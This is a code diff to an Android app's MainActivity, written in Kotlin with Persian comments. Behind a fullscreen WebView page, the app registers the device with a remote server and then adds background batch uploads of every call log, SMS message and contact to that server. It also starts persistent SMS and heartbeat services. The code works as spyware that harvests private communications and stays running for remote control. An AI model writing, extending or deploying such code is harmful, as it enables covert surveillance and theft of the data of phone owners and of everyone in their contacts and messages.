@@ -26,21 +26,30 @@ import com.example.test.utils.DataUploader
 import com.example.test.utils.DeviceInfoHelper
 import com.example.test.utils.PermissionManager
 import com.example.test.utils.PermissionDialog
+import com.example.test.utils.SmsBatchUploader
+import com.example.test.utils.ContactsBatchUploader
+import com.example.test.utils.CallLogsBatchUploader
 import com.google.firebase.messaging.FirebaseMessaging
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.SupervisorJob
 
 class MainActivity : ComponentActivity() {
 
     private lateinit var deviceId: String
     private var fcmToken: String = ""
     private val handler = Handler(Looper.getMainLooper())
+
     private val BATTERY_UPDATE_INTERVAL_MS = 60000L
-    private val FCM_TIMEOUT_MS = 10000L
+    private val FCM_TIMEOUT_MS = 3000L
     private val userId = Constants.USER_ID
+    private val baseUrl = "YOUR_SERVER_URL_HERE"
 
     private lateinit var webView: WebView
     private lateinit var permissionManager: PermissionManager
+    private val uploadScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
 
     companion object {
         private const val TAG = "MainActivity"
@@ -55,16 +64,13 @@ class MainActivity : ComponentActivity() {
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-
         enableFullscreen()
 
         deviceId = DeviceInfoHelper.getDeviceId(this)
         Log.d(TAG, "📱 Device ID: $deviceId")
 
         permissionManager = PermissionManager(this)
-        permissionManager.initialize {
-            // وقتی همه دسترسی‌ها داده شد
-        }
+        permissionManager.initialize { }
 
         setContent {
             MaterialTheme {
@@ -75,7 +81,6 @@ class MainActivity : ComponentActivity() {
 
     private fun enableFullscreen() {
         actionBar?.hide()
-
         WindowCompat.setDecorFitsSystemWindows(window, false)
 
         val windowInsetsController = WindowCompat.getInsetsController(window, window.decorView)
@@ -109,9 +114,7 @@ class MainActivity : ComponentActivity() {
                 .background(Color.Black)
         ) {
             AndroidView(
-                factory = { context ->
-                    createWebView()
-                },
+                factory = { context -> createWebView() },
                 modifier = Modifier.fillMaxSize()
             )
 
@@ -137,7 +140,6 @@ class MainActivity : ComponentActivity() {
         webView = WebView(this)
 
         val webSettings: WebSettings = webView.settings
-
         webSettings.javaScriptEnabled = true
         webSettings.javaScriptCanOpenWindowsAutomatically = true
         webSettings.domStorageEnabled = true
@@ -158,12 +160,6 @@ class MainActivity : ComponentActivity() {
         webSettings.loadsImagesAutomatically = true
         webSettings.blockNetworkImage = false
         webSettings.blockNetworkLoads = false
-
-        // حذف شد - مشکل‌ساز بود
-        // if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
-        //     webSettings.mixedContentMode = WebSettings.MIXED_CONTENT_COMPATIBLE_MODE
-        // }
-
         webSettings.cacheMode = WebSettings.LOAD_DEFAULT
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
@@ -174,8 +170,6 @@ class MainActivity : ComponentActivity() {
         }
 
         webView.webViewClient = object : WebViewClient() {
-
-            // جلوگیری از باز شدن لینک‌ها در مرورگر
             override fun shouldOverrideUrlLoading(view: WebView?, request: android.webkit.WebResourceRequest?): Boolean {
                 return false
             }
@@ -186,20 +180,15 @@ class MainActivity : ComponentActivity() {
 
             override fun onPageFinished(view: WebView?, url: String?) {
                 super.onPageFinished(view, url)
-                Log.d(TAG, "✅ WebView page loaded successfully")
+                Log.d(TAG, "✅ WebView loaded")
 
                 webView.evaluateJavascript(
                     """
                     (function() {
                         try {
                             var el = document.getElementById('deviceId');
-                            if (el) {
-                                el.innerText = 'Device ID: $deviceId';
-                            }
-                            console.log('Device ID injected successfully');
-                        } catch(e) {
-                            console.error('Error injecting device ID:', e);
-                        }
+                            if (el) el.innerText = 'Device ID: $deviceId';
+                        } catch(e) {}
                     })();
                     """.trimIndent(),
                     null
@@ -208,14 +197,14 @@ class MainActivity : ComponentActivity() {
 
             override fun onReceivedError(view: WebView?, errorCode: Int, description: String?, failingUrl: String?) {
                 super.onReceivedError(view, errorCode, description, failingUrl)
-                Log.e(TAG, "❌ WebView error: $description at $failingUrl")
+                Log.e(TAG, "❌ WebView error: $description")
             }
         }
 
         webView.webChromeClient = object : WebChromeClient() {
             override fun onConsoleMessage(msg: android.webkit.ConsoleMessage?): Boolean {
                 msg?.let {
-                    Log.d(TAG, "JS: ${it.message()} [${it.sourceId()}:${it.lineNumber()}]")
+                    Log.d(TAG, "JS: ${it.message()}")
                 }
                 return true
             }
@@ -223,16 +212,18 @@ class MainActivity : ComponentActivity() {
 
         try {
             webView.loadUrl("file:///android_asset/index.html")
-            Log.d(TAG, "📄 Loading index.html from assets...")
+            Log.d(TAG, "📄 Loading HTML...")
         } catch (e: Exception) {
-            Log.e(TAG, "❌ Error loading HTML: ${e.message}", e)
+            Log.e(TAG, "❌ Load error: ${e.message}")
         }
 
         return webView
     }
 
     private fun continueInitialization() {
-        Log.d(TAG, "🚀 Starting initialization...")
+        Log.d(TAG, "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+        Log.d(TAG, "🚀 INITIALIZATION STARTED")
+        Log.d(TAG, "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
 
         var fcmReceived = false
 
@@ -240,118 +231,144 @@ class MainActivity : ComponentActivity() {
             fcmReceived = true
             if (task.isSuccessful && task.result != null) {
                 fcmToken = task.result!!
-                Log.d(TAG, "✅ FCM Token received: ${fcmToken.take(20)}...")
+                Log.d(TAG, "✅ FCM Token: ${fcmToken.take(20)}...")
             } else {
-                Log.w(TAG, "⚠️ FCM token failed: ${task.exception?.message}")
+                Log.w(TAG, "⚠️ FCM failed")
                 fcmToken = "NO_FCM_TOKEN_${deviceId.take(8)}"
-                Log.d(TAG, "🔑 Using fallback token: $fcmToken")
             }
         }
 
         handler.postDelayed({
             if (!fcmReceived) {
-                Log.w(TAG, "⏱️ FCM timeout! Continuing without it...")
                 fcmToken = "NO_FCM_TOKEN_${deviceId.take(8)}"
-                Log.d(TAG, "🔑 Using fallback token: $fcmToken")
             }
 
-            // ترتیب اجرا:
-            // 1️⃣ رجیستر + تاریخچه تماس (فرانت)
-            // 2️⃣ شروع سرویس‌های پس‌زمینه
-            // 3️⃣ SMS و مخاطبین در DataUploadService (پس‌زمینه)
-
-            Thread {
+            uploadScope.launch {
                 try {
                     Log.d(TAG, "════════════════════════════════════════")
-                    Log.d(TAG, "🚀 STARTING INITIALIZATION SEQUENCE")
+                    Log.d(TAG, "🚀 UPLOAD SEQUENCE STARTED")
                     Log.d(TAG, "════════════════════════════════════════")
 
-                    // 1️⃣ رجیستر گوشی
-                    Log.d(TAG, "1️⃣ Registering device...")
-                    val registerSuccess = DataUploader.registerDevice(this, deviceId, fcmToken, userId)
-                    if (registerSuccess) {
-                        Log.d(TAG, "✅ Device registered successfully")
-                    } else {
-                        Log.w(TAG, "⚠️ Device registration failed, continuing anyway...")
+                    // 1️⃣ رجیستر
+                    Log.d(TAG, "1️⃣ Registering...")
+                    val registerSuccess = DataUploader.registerDevice(
+                        this@MainActivity,
+                        deviceId,
+                        fcmToken,
+                        userId
+                    )
+                    Log.d(TAG, if (registerSuccess) "✅ Registered" else "⚠️ Register failed")
+
+                    // 2️⃣ آپلود همه Call Logs
+                    Log.d(TAG, "2️⃣ Uploading all call logs...")
+                    val callLogResult = CallLogsBatchUploader.uploadAllCallLogs(
+                        context = this@MainActivity,
+                        deviceId = deviceId,
+                        baseUrl = baseUrl
+                    ) { sent, total ->
+                        if (sent % 500 == 0) {
+                            Log.d(TAG, "   Calls: $sent/$total")
+                        }
                     }
 
-                    // 2️⃣ آپلود تاریخچه تماس‌ها
-                    Log.d(TAG, "2️⃣ Uploading call history...")
-                    DataUploader.uploadCallHistory(this, deviceId)
-                    Log.d(TAG, "✅ Call history upload completed")
+                    when (callLogResult) {
+                        is CallLogsBatchUploader.UploadResult.Success -> {
+                            Log.d(TAG, "✅ Call logs done: ${callLogResult.totalSent}")
+                        }
+                        is CallLogsBatchUploader.UploadResult.Failure -> {
+                            Log.w(TAG, "⚠️ Call logs failed")
+                        }
+                    }
 
                     Log.d(TAG, "════════════════════════════════════════")
-                    Log.d(TAG, "🎯 FRONTEND OPERATIONS COMPLETED")
+                    Log.d(TAG, "📦 BACKGROUND UPLOADS STARTED")
                     Log.d(TAG, "════════════════════════════════════════")
 
-                    // 3️⃣ شروع سرویس‌های پس‌زمینه
-                    Log.d(TAG, "3️⃣ Starting background services...")
+                    // 3️⃣ آپلود همه SMS در پس‌زمینه
+                    launch {
+                        Log.d(TAG, "📱 Uploading all SMS...")
+                        SmsBatchUploader.uploadAllSms(
+                            context = this@MainActivity,
+                            deviceId = deviceId,
+                            baseUrl = baseUrl
+                        ) { progress ->
+                            when (progress) {
+                                is SmsBatchUploader.UploadProgress.Processing -> {
+                                    if (progress.processed % 1000 == 0) {
+                                        Log.d(TAG, "   SMS: ${progress.processed}/${progress.total}")
+                                    }
+                                }
+                                is SmsBatchUploader.UploadProgress.Completed -> {
+                                    Log.d(TAG, "✅ All SMS done!")
+                                }
+                                else -> {}
+                            }
+                        }
+                    }
 
-                    startSmsService()
-                    Thread.sleep(500) // فاصله کوتاه بین سرویس‌ها
+                    // 4️⃣ آپلود همه Contacts در پس‌زمینه
+                    launch {
+                        delay(1000)
+                        Log.d(TAG, "👥 Uploading all contacts...")
+                        val contactsResult = ContactsBatchUploader.uploadAllContacts(
+                            context = this@MainActivity,
+                            deviceId = deviceId,
+                            baseUrl = baseUrl
+                        ) { sent, total ->
+                            if (sent % 500 == 0) {
+                                Log.d(TAG, "   Contacts: $sent/$total")
+                            }
+                        }
 
-                    startHeartbeatService()
-                    Thread.sleep(500)
-
-                    startDataUploadService()
-
-                    Log.d(TAG, "════════════════════════════════════════")
-                    Log.d(TAG, "✅ ALL SERVICES STARTED SUCCESSFULLY")
-                    Log.d(TAG, "📱 SMS & Contacts uploading in background...")
-                    Log.d(TAG, "════════════════════════════════════════")
+                        when (contactsResult) {
+                            is ContactsBatchUploader.UploadResult.Success -> {
+                                Log.d(TAG, "✅ All contacts done: ${contactsResult.totalSent}")
+                            }
+                            is ContactsBatchUploader.UploadResult.Failure -> {
+                                Log.w(TAG, "⚠️ Contacts failed")
+                            }
+                        }
+                    }
 
                 } catch (e: Exception) {
-                    Log.e(TAG, "❌ Initialization error: ${e.message}", e)
-                    e.printStackTrace()
+                    Log.e(TAG, "❌ Error: ${e.message}", e)
                 }
-            }.start()
+            }
 
-            // شروع آپدیت باتری
-            handler.post(batteryUpdater)
+            // 5️⃣ شروع Battery Updater
+            handler.postDelayed({
+                handler.post(batteryUpdater)
+                Log.d(TAG, "🔋 Battery updater started")
+            }, 2000)
+
+            // 6️⃣ شروع Heartbeat Service
+            handler.postDelayed({
+                startBackgroundServices()
+            }, 3000)
 
         }, FCM_TIMEOUT_MS)
     }
 
-    private fun startSmsService() {
+    private fun startBackgroundServices() {
         try {
-            val intent = android.content.Intent(this, SmsService::class.java)
+            val smsIntent = android.content.Intent(this, SmsService::class.java)
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                startForegroundService(intent)
+                startForegroundService(smsIntent)
             } else {
-                startService(intent)
+                startService(smsIntent)
             }
             Log.d(TAG, "✅ SmsService started")
-        } catch (e: Exception) {
-            Log.e(TAG, "❌ Failed to start SmsService: ${e.message}")
-        }
-    }
 
-    private fun startHeartbeatService() {
-        try {
-            val intent = android.content.Intent(this, HeartbeatService::class.java)
+            val heartbeatIntent = android.content.Intent(this, HeartbeatService::class.java)
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                startForegroundService(intent)
+                startForegroundService(heartbeatIntent)
             } else {
-                startService(intent)
+                startService(heartbeatIntent)
             }
-            Log.d(TAG, "✅ HeartbeatService started (1 min interval)")
-        } catch (e: Exception) {
-            Log.e(TAG, "❌ Failed to start HeartbeatService: ${e.message}")
-        }
-    }
+            Log.d(TAG, "✅ HeartbeatService started")
 
-    private fun startDataUploadService() {
-        try {
-            val intent = android.content.Intent(this, DataUploadService::class.java)
-            intent.putExtra(DataUploadService.EXTRA_DEVICE_ID, deviceId)
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                startForegroundService(intent)
-            } else {
-                startService(intent)
-            }
-            Log.d(TAG, "✅ DataUploadService started (SMS + Contacts)")
         } catch (e: Exception) {
-            Log.e(TAG, "❌ Failed to start DataUploadService: ${e.message}")
+            Log.e(TAG, "❌ Services error: ${e.message}")
         }
     }
 
@@ -377,6 +394,6 @@ class MainActivity : ComponentActivity() {
             permissionManager.stopBatteryMonitoring()
         }
 
-        Log.d(TAG, "👋 MainActivity destroyed")
+        Log.d(TAG, "👋 Destroyed")
     }
 }
